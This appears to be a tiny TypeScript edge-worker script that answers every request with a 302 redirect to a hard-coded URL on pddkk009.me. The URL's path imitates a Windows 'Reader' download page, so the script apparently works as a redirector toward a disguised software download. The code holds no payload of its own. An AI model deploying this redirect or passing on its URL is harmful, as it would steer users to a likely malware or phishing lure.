// redirect.ts

// Define the redirect URL
const redirectUrl = "https://pddkk009.me/reader-download-os-Windows-10name-Reader/"; // Replace with the URL you want to redirect to

// Handle the request
addEventListener("fetch", (event) => {
  event.respondWith(
    new Response(null, {
      status: 302, // HTTP status for redirection
      headers: {
        "Location": redirectUrl, // The URL to redirect to
      },
    })
  );
});
